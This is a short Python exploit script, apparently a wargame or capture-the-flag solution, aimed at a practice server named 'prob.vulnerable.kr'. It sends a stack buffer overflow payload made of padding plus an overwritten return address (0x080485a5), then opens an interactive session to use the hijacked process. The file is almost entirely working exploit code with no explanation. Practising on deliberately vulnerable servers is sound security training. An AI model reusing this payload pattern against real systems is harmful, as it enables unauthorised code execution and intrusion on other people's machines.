#!/usr/bin/env python3

#-*- utf-8 -*-
import socket
import time
import struct
import telnetlib
import os


def connect( ip, port ):
    return socket.create_connection((ip, port))

def p( x ):
    return struct.pack('<I', x )

def p64( x ):
    return struct.pack('<Q', x )

def u( x ):
    return struct.unpack('<I', x )[0]

def u64( x ):
    return struct.unpack('<Q', x )[0]

def interact( s ):
    print('----- interactive mode -----')
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def main():
    s = connect('prob.vulnerable.kr', 20026)
    #s = connect('localhost', 20035 )
    time.sleep(1)
    print( repr(s.recv( 1000 )) )

    payload = b''
    payload += b'A'*0x12c
    payload += b'BBBB'
    payload += p( 0x080485a5 )
    payload += b'\n'

    s.sendall( payload )
    
    time.sleep( 1 )
    print( s.recv( 1000 ) )
    interact( s )


if( __name__ == '__main__' ): main()
